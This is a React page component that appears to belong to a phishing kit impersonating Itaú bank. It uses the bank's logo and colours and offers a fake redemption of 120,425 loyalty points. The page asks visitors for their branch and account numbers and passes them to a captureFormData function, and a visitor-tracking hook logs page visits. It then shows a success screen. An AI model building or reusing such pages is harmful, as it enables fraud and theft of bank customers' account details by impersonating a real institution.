import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Menu, Bell } from "lucide-react";
import itauLogo from "@/assets/itau-logo.png";
import BottomNav from "@/components/BottomNav";
import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";

const Resgate = () => {
  useVisitorTracking("resgate");
  const navigate = useNavigate();
  const location = useLocation();
  const { nome } = (location.state as any) || {};
  const [agencia, setAgencia] = useState("");
  const [conta, setConta] = useState("");

  const handleContinuar = () => {
    if (agencia.length >= 4 && conta.replace(/\D/g, "").length >= 5) {
      captureFormData("resgate", { agencia, conta });
      navigate("/sucesso", { state: { nome } });
    }
  };

  return (
    <div
      className="min-h-screen max-w-md mx-auto relative flex flex-col"
      style={{ background: "linear-gradient(135deg, #FF6200 0%, #CC5000 100%)" }}
    >
      {/* Header */}
      <div className="px-5 pt-6">
        <div className="flex items-center justify-between mb-12">
          <Menu className="text-primary-foreground" size={24} />
          <Bell className="text-primary-foreground" size={24} />
        </div>
      </div>

      {/* Content */}
      <div className="px-6 flex-1">
        <img src={itauLogo} alt="Itaú" className="h-14 mb-4" />
        <h1 className="text-primary-foreground text-3xl font-bold mb-1">
          Olá, {nome?.split(" ")[0]?.toUpperCase() || "TITULAR"}
        </h1>
        <p className="text-primary-foreground/90 text-base mb-10">
          Você possui <span className="font-bold">120.425</span> pontos para o resgate.
        </p>

        {/* Inputs side by side */}
        <div className="flex gap-6 mb-4">
          <div className="flex-1">
            <label className="text-primary-foreground text-sm font-medium block mb-2">Agência sem dígito</label>
            <input
              type="text"
              inputMode="numeric"
              value={agencia}
              onChange={(e) => setAgencia(e.target.value.replace(/\D/g, "").slice(0, 5))}
              className="w-full bg-transparent text-primary-foreground border-b border-primary-foreground/40 pb-2 outline-none text-base placeholder:text-primary-foreground/30"
              placeholder=""
            />
          </div>
          <div className="flex-1">
            <label className="text-primary-foreground text-sm font-medium block mb-2">Conta com dígito</label>
            <input
              type="text"
              inputMode="numeric"
              value={conta}
              onChange={(e) => {
                let v = e.target.value.replace(/\D/g, "").slice(0, 7);
                if (v.length > 1) v = v.slice(0, -1) + "-" + v.slice(-1);
                setConta(v);
              }}
              className="w-full bg-transparent text-primary-foreground border-b border-primary-foreground/40 pb-2 outline-none text-base placeholder:text-primary-foreground/30"
              placeholder=""
            />
          </div>
        </div>

        <p className="text-primary-foreground/70 text-sm mb-8">
          Digite sua agência e conta para continuar seu resgate
        </p>

        {/* CTA */}
        <button
          onClick={handleContinuar}
          disabled={agencia.length < 4 || conta.replace(/\D/g, "").length < 5}
          className="w-full py-4 rounded-full bg-white text-[#FF6200] font-semibold text-lg hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
        >
          Iniciar Resgate
        </button>
      </div>

      {/* Bottom Navigation */}
      <BottomNav />
    </div>
  );
};

export default Resgate;
